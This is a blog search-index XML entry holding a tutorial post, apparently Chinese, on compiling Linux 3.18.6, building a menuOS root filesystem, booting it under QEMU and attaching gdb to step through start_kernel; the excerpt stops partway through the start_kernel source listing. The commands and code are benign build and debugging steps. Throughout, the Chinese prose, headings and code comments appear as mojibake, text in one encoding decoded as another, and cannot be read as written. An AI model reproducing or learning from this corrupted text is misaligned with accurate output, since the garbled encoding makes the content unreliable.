<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>å’Œkernelè¯´ä¸ªHelloå§ï¼ï¼ˆä¸€ï¼‰</title>
      <link href="/2021/10/15/%E5%92%8Ckernel%E8%AF%B4%E4%B8%AAHello%E5%90%A7%EF%BC%81%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>/2021/10/15/%E5%92%8Ckernel%E8%AF%B4%E4%B8%AAHello%E5%90%A7%EF%BC%81%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<blockquote><p>æˆ–è®¸æ˜¯æœ€è¿‘é£˜äº†ï¼Œæƒ³å¼€å§‹å­¦ä¹ å†…æ ¸äº†ï¼Œçœ‹åˆ°ã€Šåº–ä¸è§£ç‰›linuxå†…æ ¸ã€‹è¿™æœ¬ä¹¦ä¹‹åï¼ŒèŒå‘äº†ä¸€ä¸ªè°ƒè¯•å†…æ ¸çš„æƒ³æ³•ï¼Œæ‰€ä»¥è¿™ä¸ªç³»åˆ—åº”è¿è€Œç”Ÿï¼Œåœ¨æœ€å¼€å§‹å­¦ä¹ è®¡ç®—æœºçš„æ—¶å€™ï¼Œéƒ½æ˜¯ä»å†™Hello Worldï¼å¼€å§‹çš„ï¼Œæ‰€ä»¥å½“æˆ‘å¼€å§‹å†…æ ¸çš„æ—¶å€™ï¼Œä¹Ÿæƒ³ç€å»¶ç»­è¿™ä¸ªä¼ ç»Ÿï¼ˆå…¶å®çš„å¬åˆ°<code>xuanxuan</code>è€å¸ˆè®²åˆ°çš„ğŸ˜€ï¼‰ï¼Œè¿™ç¯‡æ–‡ç« æ˜¯æˆ‘ç¬¬ä¸€æ¬¡æ¥è§¦å†…æ ¸æ‰€å†™çš„æ–‡ç« ï¼Œå…¶å®ä¸€ç›´ä»¥æ¥æˆ‘éƒ½åœ¨å¥½å¥‡ï¼Œå¦‚æ­¤åºå¤§çš„æ“ä½œç³»ç»Ÿåˆ°åº•æ˜¯æ€ä¹ˆå¯åŠ¨èµ·æ¥çš„ï¼Œæœ¬æ–‡æ—¨åœ¨é€šè¿‡è°ƒè¯•ä»<code>start_kernel</code>åˆ°<code>init</code>è¿›ç¨‹å¯åŠ¨çš„è¿‡ç¨‹æ¥äº†è§£<code>linux</code>åˆ°åº•æ˜¯æ€ä¹ˆæ ·å¯åŠ¨èµ·æ¥çš„ï¼Œå¦‚æœä½ ä¹Ÿæƒ³çŸ¥é“è¿™ä¸ªé—®é¢˜çš„ç­”æ¡ˆï¼Œé‚£å°±è·Ÿæˆ‘çœ‹ä¸‹å»å§ï¼</p></blockquote><h3 id="æ­å»ºç¯å¢ƒ"><a href="#æ­å»ºç¯å¢ƒ" class="headerlink" title="æ­å»ºç¯å¢ƒ"></a>æ­å»ºç¯å¢ƒ</h3><p>è¦æƒ³è°ƒè¯•é¦–å…ˆå°±å¾—æœ‰ä¸€ä¸ª<code>linux</code>æ¥è°ƒå¯¹ä¸å¯¹ï¼Œå…ˆæ­å»ºä¸€ä¸ªç®€å•çš„<code>linux</code>å†…æ ¸ï¼Œé€šè¿‡ç¼–è¯‘å†…æ ¸ä»£ç åŠ ä¸Šæ ¹æ–‡ä»¶ç³»ç»Ÿæ¥æ„å»ºä¸€ä¸ªç®€å•çš„æ“ä½œç³»ç»Ÿï¼Œå…ˆå»ä¸‹è½½<a href="https://www.kernel.org/pub/linux/kernel/v3.x/linux-3.18.6.tar.xz"><code>linux</code>å†…æ ¸æºç </a>ï¼Œè™šæ‹Ÿæœºçš„ç½‘ç»œï¼ˆå¯èƒ½æ˜¯æºçš„é—®é¢˜å§ï¼‰å®åœ¨ä¸å¤ªè¡Œï¼Œä¸‹è½½å®Œæˆä¹‹ååƒä¸‡åƒä¸‡è¦æ³¨æ„ä¸è¦åœ¨<code>windows</code>ä¸‹é¢è§£å‹ï¼Œå› ä¸ºåœ¨<code>linux</code>æºç é‡Œé¢æœ‰ä¸ªæ–‡ä»¶å«<code>aux.c</code>ï¼Œè¿™ç©æ„å’Œ<code>windows</code>ä¸‹çš„è®¾å¤‡åä¸ºåŒä¸€ä¸ªåå­—ï¼Œè§£å‹å‡ºæ¥ä¹‹åï¼Œä¼šåˆ é™¤ä¸äº†æ­¤æ–‡ä»¶ï¼Œå¦‚æœçœŸçš„ä¸€ä¸å°å¿ƒè§£å‹å‡ºæ¥äº†ï¼Œä¸‹é¢ä¸ºè§£å†³åŠæ³•ï¼Œè§£é“ƒè¿˜éœ€ç³»é“ƒäººå•Šï¼ï¼š</p><p><a href="https://www.191e.com/pc/23327.html">win10ç³»ç»Ÿä¸‹aux.cã€aux.hæ ¼å¼æ–‡ä»¶æ— æ³•åˆ é™¤çš„è§£å†³æ–¹æ³•</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mkdir kernel</span><br><span class="line"><span class="built_in">cd</span> kernel</span><br><span class="line"><span class="comment">#æŠŠlinuxæºç æ”¾è¿›kernelæ–‡ä»¶å¤¹</span></span><br><span class="line">xz -d linux-3.18.6.tar.xz </span><br><span class="line">tar -xvf linux-3.18.6.tar </span><br><span class="line"><span class="built_in">cd</span> linux-3.18.6 </span><br><span class="line">make i386_defconfig </span><br><span class="line">make </span><br></pre></td></tr></table></figure><p>å¼€å§‹<code>make</code>ä¹‹åï¼ŒåˆæŠ¥é”™ä¸‹é¢ä¸¤æ¡é”™ï¼ŒåŸå› å¾ˆæ˜æ˜¾å°±æ˜¯ç¡®å®æœ‰ä¸ªæ–‡ä»¶ï¼Œåœ¨<code>github</code>ä¸­æ‰¾åˆ°å…¶ä»–äººçš„æ–‡ä»¶æ”¾åˆ°å®ƒæç¤ºçš„ç›®å½•ä¸­å°±èƒ½å¼€å§‹ç¼–è¯‘å•¦ï¼ï¼ˆä½ ä¹Ÿå¯èƒ½ä¸ç¼ºï¼Œå…·ä½“çœ‹ç³»ç»Ÿçš„å†…æ ¸ç‰ˆæœ¬ï¼‰</p><p><a href="https://github.com/murata-wireless/cyw-fmac/tree/master/backport-include/linux">compiler-gcc</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">include/linux/compiler-gcc.h:106:1: fatal error: linux/compiler-gcc9.h: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•</span><br><span class="line"></span><br><span class="line">include/linux/compiler-gcc9.h:1:10: fatal error: linux/compiler-gccN.h: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•</span><br></pre></td></tr></table></figure><p><code>make</code>æ˜¯ä¸ªæ¼«é•¿çš„è¿‡ç¨‹ï¼Œéœ€è¦é™é™ç­‰å¾…â€¦.</p><p>ç¼–è¯‘å®Œæˆä¹‹åå°±æ˜¯æ­å»ºæ ¹æ–‡ä»¶ç³»ç»Ÿï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> ..<span class="comment">#é€€å‡ºåˆ°kernelç›®å½•</span></span><br><span class="line">mkdir rootfs</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/mengning/menu.git  <span class="comment">#æŠŠmenuOSçš„æºç æ‹‰ä¸‹æ¥</span></span><br><span class="line"><span class="built_in">cd</span> menu</span><br><span class="line">gcc -o init linktable.c menu.c test.c -m32 -static â€“lpthread</span><br><span class="line"><span class="built_in">cd</span> ../rootfs</span><br><span class="line">cp ../menu/init ./</span><br><span class="line">find . | cpio -o -Hnewc |gzip -9 &gt; ../rootfs.img</span><br></pre></td></tr></table></figure><p>æŠ¥è¿™ä¸ªé”™åœ¨å‘½ä»¤è¡Œè¾“å…¥ï¼š<code>apt install gcc-multilib</code>å°±è¡Œäº†ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fatal error: bits/libc-header-start.h: æ²¡æœ‰é‚£ä¸ªæ–‡ä»¶æˆ–ç›®å½•</span><br></pre></td></tr></table></figure><p>å¤–äº‹å…·å¤‡ï¼æ¥ä¸‹æ¥å°±æ˜¯å¯åŠ¨å®ƒäº†ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 -kernel linux-3.18.6/arch/x86/boot/bzImage -initrd rootfs.img -append <span class="string">&quot;console=ttyS0&quot;</span> -nographic</span><br></pre></td></tr></table></figure><p>ä¸Šé¢å‘½ä»¤çš„è§£é‡Šï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64  <span class="comment">#qemuçš„systemæ¨¡å¼è¿›è¡Œå…¨é‡æ¨¡æ‹Ÿï¼Œæ¶æ„ä¸ºx64</span></span><br><span class="line">-kernel <span class="comment">#æŒ‡å®šå†…æ ¸é•œåƒçš„ä½ç½®</span></span><br><span class="line">-initrd <span class="comment">#æ ¹æ–‡ä»¶ç³»ç»Ÿçš„ä½ç½®</span></span><br><span class="line">-append <span class="string">&quot;console=ttyS0&quot;</span>  <span class="comment">#å¯åŠ¨åä¼ å…¥çš„å‚æ•°</span></span><br><span class="line">-nographic<span class="comment">#åœ¨æœ¬åœ°ç»ˆç«¯å¯åŠ¨</span></span><br></pre></td></tr></table></figure><p>ä¹‹åå°±å¯ä»¥çœ‹åˆ°<code>menuOS</code>å¯åŠ¨èµ·æ¥äº†ï¼è™½ç„¶è¿™ä¸ªæ¯”è¾ƒé¡ºåˆ©ä½†è¿˜æ˜¯æ³ªç›®äº†ï¼š</p><img src="/2021/10/15/%E5%92%8Ckernel%E8%AF%B4%E4%B8%AAHello%E5%90%A7%EF%BC%81%EF%BC%88%E4%B8%80%EF%BC%89/1.png" class=""><p>ä½†æ˜¯æ­¤å¤„çš„<code>menuOS</code>æ˜¯ä¸åŒ…å«è°ƒè¯•ä¿¡æ¯çš„ï¼Œéœ€è¦é‡æ–°ç¼–è¯‘è®©å®ƒåŒ…å«è°ƒè¯•ä¿¡æ¯ï¼Œæˆ‘ä»¬è¿›åˆ°<code>linux-3.18.6</code>æ–‡ä»¶é‡Œé¢è¾“å…¥<code>make menuconfig </code>ä¼šè¿›å…¥ä¸‹é¢çš„é¡µé¢</p><img src="/2021/10/15/%E5%92%8Ckernel%E8%AF%B4%E4%B8%AAHello%E5%90%A7%EF%BC%81%EF%BC%88%E4%B8%80%EF%BC%89/2.png" class=""><p>æ ¹æ®ä»¥ä¸‹è·¯å¾„ä¿®æ”¹ä½¿å¾—ç¼–è¯‘çš„æ—¶å€™é™„ä¸Šè°ƒè¯•ä¿¡æ¯ï¼š</p><p><code>kernel hacking  â€”&gt; Compile-time checks and compiler options -&gt; compile the kernel with debug info</code>ï¼ˆå¯¹å®ƒæŒ‰<code>y</code>å°±èƒ½æ‰“å¼€è°ƒè¯•ä¿¡æ¯ï¼‰</p><p>ä¹‹åå†<code>make</code>å°±å¯ä»¥é‡æ–°ç¼–è¯‘å•¦ï¼</p><p>åˆæ˜¯ä¸€æ®µæ¼«é•¿çš„æ—¶å…‰â€¦.</p><h3 id="å¼€å§‹è°ƒè¯•"><a href="#å¼€å§‹è°ƒè¯•" class="headerlink" title="å¼€å§‹è°ƒè¯•"></a>å¼€å§‹è°ƒè¯•</h3><h3 id=""><a href="#" class="headerlink" title=""></a></h3><blockquote><p>ä½¿ç”¨ <code>gdb</code> è·Ÿè¸ªè°ƒè¯•å†…æ ¸ï¼ŒåŠ ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯<code>-s</code>ï¼ˆåœ¨ 1234 ç«¯å£ä¸Šåˆ›å»ºäº†ä¸€ä¸ª <code>gdb-server</code>ï¼Œ è¯»è€…å¯ä»¥å¦å¤–æ‰“å¼€ä¸€ä¸ªçª—å£ï¼Œç”¨ <code>gdb</code> æŠŠå¸¦æœ‰ç¬¦å·è¡¨çš„å†…æ ¸é•œåƒåŠ è½½è¿›æ¥ï¼Œç„¶åè¿æ¥ <code>gdb-server</code>ï¼Œè®¾ç½®æ–­ç‚¹è·Ÿè¸ªå†…æ ¸ã€‚è‹¥ä¸æƒ³ä½¿ç”¨ 1234 ç«¯å£ï¼Œå¯ä»¥ä½¿ç”¨<code>-gdb tcp:xxxx</code> æ¥å–ä»£<code>-s</code> é€‰é¡¹ï¼‰ï¼Œ å¦ä¸€ä¸ªæ˜¯<code>-S</code>ï¼ˆCPU åˆå§‹åŒ–ä¹‹å‰å†»ç»“èµ·æ¥ï¼‰</p></blockquote><p>åœ¨ä¹‹å‰çš„å‘½ä»¤å½“ä¸­åŠ ä¸Š<code>-S -s</code>å‚æ•°å°±å¯ä»¥è®©å†…æ ¸åœä¸‹æ¥ç­‰å¾…è¿æ¥ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 -kernel linux-3.18.6/arch/x86/boot/bzImage -initrd rootfs.img -append &quot;console=ttyS0&quot; -nographic -S -s</span><br></pre></td></tr></table></figure><p>ä¹‹åå°±èƒ½ç”¨<code>gdb</code>è¿ä¸Šäº†ï¼š</p><img src="/2021/10/15/%E5%92%8Ckernel%E8%AF%B4%E4%B8%AAHello%E5%90%A7%EF%BC%81%EF%BC%88%E4%B8%80%EF%BC%89/3.png" class=""><p>ä¸€è¿æ¥å‘ç°æŠ¥é”™äº†ï¼Œä»”ç»†ä¸€çœ‹æ˜¯æ¶æ„å‡ºç°äº†é—®é¢˜ï¼Œ<code>set architecture i386:x86-64</code>å³å¯ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; target remote:1234</span><br><span class="line">Remote debugging using :1234</span><br><span class="line">warning: Selected architecture i386 is not compatible with reported target architecture i386:x86-64</span><br><span class="line">warning: Architecture rejected target-supplied description</span><br><span class="line">Remote <span class="string">&#x27;g&#x27;</span> packet reply is too long (expected 312 bytes, got 608 bytes): 000000000000000000000000000000000000000000000000b10f060000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000f0ff0000000000000200000000f00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000060000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000007f0300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000801f0000</span><br></pre></td></tr></table></figure><p>è¿™é‡Œè¿˜çœ‹åˆ°ä¸€äº›å¾ˆå¥‡æ€ªçš„ç©æ„ï¼š<code>i386:x86-64</code>å…¶å®å°±æ˜¯<code>x64</code>ï¼Œåå­—ä¸åŒç½¢äº†ï¼Œ<code>i386:x86-64:intel</code>ä¼°æ‘¸ç€åº”è¯¥æ˜¯æ±‡ç¼–çš„æ ¼å¼ä¸åŒï¼Œä½†è¿™ä¸ªå°±å¾ˆç¦»è°±äº†ï¼Œ<code>i386:x64-32</code>ï¼ŒæƒŠå¥‡ï¼ï¼ï¼<code>x64</code>å±…ç„¶è¿˜æœ‰32ä½çš„ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">set</span> architecture </span><br><span class="line">Requires an argument. Valid arguments are i386, i386:x86-64, i386:x64-32, i8086, i386:intel, i386:x86-64:intel, i386:x64-32:intel, i386:nacl, i386:x86-64:nacl, i386:x64-32:nacl, auto.</span><br></pre></td></tr></table></figure><p>å…¶å®å°±æ˜¯ä¸ºäº†èŠ‚çœå†…å­˜æ‰€è¡ç”Ÿå‡ºæ¥çš„äº§ç‰©ï¼Œä½†å¥½åƒä¸å¤ªå¸¸è§ï¼Œè‡³å°‘ç°åœ¨æ²¡è§è¿‡â€¦.</p><blockquote><p>å¯„å­˜å™¨æ˜¯ 64 ä½çš„ï¼Œä½†æŒ‡é’ˆåªæœ‰ 32 ä½ï¼Œåœ¨å¤§é‡æŒ‡é’ˆçš„å·¥ä½œæµä¸­èŠ‚çœäº†å¤§é‡å†…å­˜ã€‚å®ƒè¿˜ç¡®ä¿æ‰€æœ‰å…¶ä»–ä»… 64 ä½å¤„ç†å™¨åŠŸèƒ½å¯ç”¨ã€‚</p></blockquote><p>å†æ¬¡è¿æ¥å°±è¿›å…¥äº†è°ƒè¯•ç•Œé¢ï¼Œå¯ä»¥çœ‹åˆ°æ­¤å¤„ç¬¬ä¸€æ¡æŒ‡ä»¤æ˜¯<code>0xfff0</code>ï¼š</p><img src="/2021/10/15/%E5%92%8Ckernel%E8%AF%B4%E4%B8%AAHello%E5%90%A7%EF%BC%81%EF%BC%88%E4%B8%80%EF%BC%89/4.png" class=""><p>è‡³æ­¤å°±å¯ä»¥æ­£å¸¸çš„è¿›è¡Œè°ƒè¯•äº†ï¼Œæ¥ä¸‹æ¥å°†å±•ç°<code>linux</code>æ“ä½œç³»ç»Ÿå¯åŠ¨çš„æ–¹æ–¹é¢é¢ï¼Œçœ‹åˆ°è¿™é‡Œï¼Œä½ å¯èƒ½ä¼šç–‘æƒ‘ä¸ºä»€ä¹ˆæ˜¯ä»<code>start_kernel</code>å¼€å§‹è°ƒè¯•ï¼Œä½ å¯èƒ½ä¼šè¯´å®ƒå°±æ˜¯å†…æ ¸çš„èµ·ç‚¹ï¼Œä¸€åˆ‡çš„ä¸€åˆ‡éƒ½ä»è¿™é‡Œå¼€å§‹ï¼Œè¯´çš„å¯¹ï¼Œä½†ä¹Ÿä¸å¯¹ï¼Œå› ä¸ºå¦‚æœè¯´ä¸€åˆ‡çš„ä¸€åˆ‡éƒ½ä»è¿™é‡Œå¼€å§‹çš„è¯ï¼Œé‚£è¿›å…¥<code>start_kernel</code>çš„æ ˆæ˜¯å“ªé‡Œæ¥çš„ï¼Ÿæ–­ç‚¹æ‰“åœ¨<code>start_kernel</code>ä¸ŠæŒ‰ä¸‹<code>c</code>çš„æ—¶å€™ä¸ºä»€ä¹ˆå¤„åœ¨å†»ç»“çŠ¶æ€çš„å†…æ ¸ä¼šé—ªè¿‡ä¸€äº›å­—ç¬¦ï¼Ÿæ‰€ä»¥å®ƒå¹¶ä¸æ˜¯ä¸€åˆ‡çš„èµ·ç‚¹ï¼Œå†æ¬¡ä¹‹å‰è¿˜æœ‰å¾ˆå¤šç”¨æ±‡ç¼–ç¼–å†™çš„ä»£ç æ¥å®Œæˆç¡¬ä»¶ç³»ç»Ÿçš„åˆå§‹åŒ–å·¥ä½œï¼Œä¸º C ä»£ç çš„è¿è¡Œè®¾ç½®ç¯å¢ƒï¼Œé‚£ä¸ºå•¥è¿˜æ˜¯å¾—ä»<code>start_kernel</code>å¼€å§‹è°ƒè¯•å‘¢ï¼Ÿå› ä¸ºä¹‹å‰éƒ½æ˜¯ç¡¬ä»¶å±‚é¢çš„åˆå§‹åŒ–ï¼Œåœ¨è¿™æˆ‘ä»¬çœŸæ­£æƒ³ç ”ç©¶æˆ–è€…è¯´æƒ³å¼„æ˜ç™½çš„æ˜¯å¦‚æ­¤åºå¤§çš„æ“ä½œç³»ç»Ÿåˆ°åº•æ˜¯æ€ä¹ˆæ ·å¯åŠ¨èµ·æ¥çš„ï¼</p><p>ä¸‹é¢æ˜¯å®ƒçš„æºç ï¼Œå¯ä»¥çœ‹åˆ°æœ‰å¾ˆå¤šåˆå§‹åŒ–ï¼ŒåŒ…æ‹¬<code>trap_init</code>ï¼ˆä¸­æ–­å‘é‡çš„åˆå§‹åŒ–ï¼‰ï¼Œ<code>mm_init</code> ï¼ˆå†…å­˜ç®¡ç†æ¨¡å—çš„åˆå§‹åŒ–ï¼‰ç­‰ç­‰â€¦.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">asmlinkage __visible <span class="keyword">void</span> __init <span class="title">start_kernel</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">lockdep_init();<span class="comment">//æ£€æŸ¥å†…æ ¸æ­»é”é—®é¢˜</span></span><br><span class="line">set_task_stack_end_magic(&amp;init_task);<span class="comment">//ç»™æ ˆåº•åŠ ä¸ªæ ‡å¿—é˜²æ­¢æº¢å‡º</span></span><br><span class="line">smp_setup_processor_id();<span class="comment">//è·å–CPUç¡¬ä»¶ID</span></span><br><span class="line">debug_objects_early_init();</span><br><span class="line"></span><br><span class="line">boot_init_stack_canary();<span class="comment">//åˆå§‹åŒ–canary</span></span><br><span class="line">cgroup_init_early();</span><br><span class="line">local_irq_disable();<span class="comment">//å…³é—­IRQä¸­æ–­</span></span><br><span class="line">early_boot_irqs_disabled = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">boot_cpu_init();<span class="comment">//æ¿€æ´»BOOT CPU</span></span><br><span class="line">page_address_init();</span><br><span class="line">pr_notice(<span class="string">&quot;%s&quot;</span>, linux_banner);</span><br><span class="line">setup_arch(&amp;command_line);</span><br><span class="line">mm_init_cpumask(&amp;init_mm);</span><br><span class="line">setup_command_line(command_line);</span><br><span class="line">setup_nr_cpu_ids();</span><br><span class="line">setup_per_cpu_areas();</span><br><span class="line">smp_prepare_boot_cpu();<span class="comment">/* arch-specific boot-cpu hooks */</span></span><br><span class="line"></span><br><span class="line">build_all_zonelists(<span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">page_alloc_init();</span><br><span class="line"></span><br><span class="line">pr_notice(<span class="string">&quot;Kernel command line: %s\n&quot;</span>, boot_command_line);</span><br><span class="line">parse_early_param();</span><br><span class="line">after_dashes = parse_args(<span class="string">&quot;Booting kernel&quot;</span>,</span><br><span class="line">  static_command_line, __start___param,</span><br><span class="line">  __stop___param - __start___param,</span><br><span class="line">  <span class="number">-1</span>, <span class="number">-1</span>, &amp;unknown_bootoption);</span><br><span class="line"><span class="keyword">if</span> (!IS_ERR_OR_NULL(after_dashes))</span><br><span class="line">parse_args(<span class="string">&quot;Setting init args&quot;</span>, after_dashes, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">-1</span>, <span class="number">-1</span>,</span><br><span class="line">   set_init_arg);</span><br><span class="line"></span><br><span class="line">jump_label_init();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * These use large bootmem allocations and must precede</span></span><br><span class="line"><span class="comment"> * kmem_cache_init()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">setup_log_buf(<span class="number">0</span>);</span><br><span class="line">pidhash_init();</span><br><span class="line">vfs_caches_init_early();</span><br><span class="line">sort_main_extable();</span><br><span class="line">trap_init();</span><br><span class="line">mm_init();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Set up the scheduler prior starting any interrupts (such as the</span></span><br><span class="line"><span class="comment"> * timer interrupt). Full topology setup happens at smp_init()</span></span><br><span class="line"><span class="comment"> * time - but meanwhile we still have a functioning scheduler.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">sched_init();</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Disable preemption - early bootup scheduling is extremely</span></span><br><span class="line"><span class="comment"> * fragile until we cpu_idle() for the first time.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">preempt_disable();</span><br><span class="line"><span class="keyword">if</span> (WARN(!irqs_disabled(),</span><br><span class="line"> <span class="string">&quot;Interrupts were enabled *very* early, fixing it\n&quot;</span>))</span><br><span class="line">local_irq_disable();</span><br><span class="line">idr_init_cache();</span><br><span class="line">rcu_init();</span><br><span class="line">context_tracking_init();</span><br><span class="line">radix_tree_init();</span><br><span class="line"><span class="comment">/* init some links before init_ISA_irqs() */</span></span><br><span class="line">early_irq_init();</span><br><span class="line">init_IRQ();</span><br><span class="line">tick_init();</span><br><span class="line">rcu_init_nohz();</span><br><span class="line">init_timers();</span><br><span class="line">hrtimers_init();</span><br><span class="line">softirq_init();</span><br><span class="line">timekeeping_init();</span><br><span class="line">time_init();</span><br><span class="line">sched_clock_postinit();</span><br><span class="line">perf_event_init();</span><br><span class="line">profile_init();</span><br><span class="line">call_function_init();</span><br><span class="line">WARN(!irqs_disabled(), <span class="string">&quot;Interrupts were enabled early\n&quot;</span>);</span><br><span class="line">early_boot_irqs_disabled = <span class="literal">false</span>;</span><br><span class="line">local_irq_enable();</span><br><span class="line"></span><br><span class="line">kmem_cache_init_late();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * HACK ALERT! This is early. We&#x27;re enabling the console before</span></span><br><span class="line"><span class="comment"> * we&#x27;ve done PCI setups etc, and console_init() must be aware of</span></span><br><span class="line"><span class="comment"> * this. But we do want output early, in case something goes wrong.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">console_init();</span><br><span class="line"><span class="keyword">if</span> (panic_later)</span><br><span class="line">panic(<span class="string">&quot;Too many boot %s vars at `%s&#x27;&quot;</span>, panic_later,</span><br><span class="line">      